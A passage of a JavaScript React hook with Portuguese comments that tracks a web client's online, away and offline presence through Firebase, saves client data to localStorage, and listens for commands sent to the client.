            originalClientId: currentClientId,
          };

          localStorage.setItem(
            `client_${emergencyId}`,
            JSON.stringify(emergencyData)
          );

          console.log("✅ CLIENTE: Dados salvos com ID de emergência");
          return { success: true, clientId: emergencyId, emergencyMode: true };
        } catch (emergencyErr) {
          console.error("🚨 ERRO total ao salvar dados:", emergencyErr);
          throw new Error("Falha total ao salvar dados: " + err.message);
        }
      }
    }
  }, []);

  // 🔌 Status de conexão de rede
  useEffect(() => {
    const handleOnline = () => {
      setIsOnline(true);
      // Se a aba estiver oculta, manter como away
      if (!isTabVisibleRef.current) {
        setPresenceStatus("away");
      } else if (isUserActive) {
        setPresenceStatus("online");
      }
    };

    const handleOffline = () => {
      setIsOnline(false);
      setPresenceStatus("offline");
    };

    window.addEventListener("online", handleOnline);
    window.addEventListener("offline", handleOffline);

    return () => {
      window.removeEventListener("online", handleOnline);
      window.removeEventListener("offline", handleOffline);
    };
  }, [isUserActive]);

  // 🚀 Inicialização
  useEffect(() => {
    const init = async () => {
      try {
        await registerVisit();
        await initializeClient();
        // Garantir presença ONLINE imediatamente ao montar (rota atual)
        try {
          await setPresenceStatus("online");
        } catch {}
        // onDisconnect -> offline
        try {
          const clientRef = ref(database, `clients/${clientId.current}`);
          onDisconnect(clientRef).update({
            status: "offline",
            online: false,
            userActive: false,
            lastActive: serverTimestamp(),
          });
        } catch (e) {
          console.warn("onDisconnect não configurado:", e?.message);
        }
        listenToClient();
        listenToCommands();
        startPing();
      } catch (error) {
        console.error("🚨 Erro na inicialização:", error);
        setLoading(false); // Garantir que loading seja false mesmo com erro
      }
    };

    init();

    // TIMEOUT DE SEGURANÇA: Garantir que loading seja false após 5 segundos
    const safetyTimeout = setTimeout(() => {
      if (loading) {
        console.warn("⚠️ Timeout de segurança: Definindo loading como false");
        setLoading(false);
      }
    }, 5000);

    // Setup do tracking de atividade
    const cleanupActivity = setupActivityTracking();

    // Detectar mudanças de rota SPA e forçar estado online visível
    const handleRouteChange = () => {
      setPresenceStatus(
        document.visibilityState === "hidden" ? "away" : "online"
      );
    };
    window.addEventListener("popstate", handleRouteChange);
    window.addEventListener("hashchange", handleRouteChange);

    // Cleanup
    return () => {
      clearTimeout(safetyTimeout);
      if (pingInterval.current) {
        clearInterval(pingInterval.current);
      }
      if (activityTimeout.current) {
        clearTimeout(activityTimeout.current);
      }
      if (unsubscribeClient.current) {
        unsubscribeClient.current();
      }
      if (unsubscribeCommands.current) {
        unsubscribeCommands.current();
      }
      if (cleanupActivity) {
        cleanupActivity();
      }
      window.removeEventListener("popstate", handleRouteChange);
      window.removeEventListener("hashchange", handleRouteChange);
    };
  }, []);

  return {
    clientId: clientId.current,
    clientData,
    commands,
    isOnline: isOnline && isUserActive,
    isUserActive,
    loading,
    error,
    updateClientData,
    clearCommands,
    // Sempre válido agora pois criamos imediatamente
    isClientIdValid: isValidClientId(clientId.current),
  };
};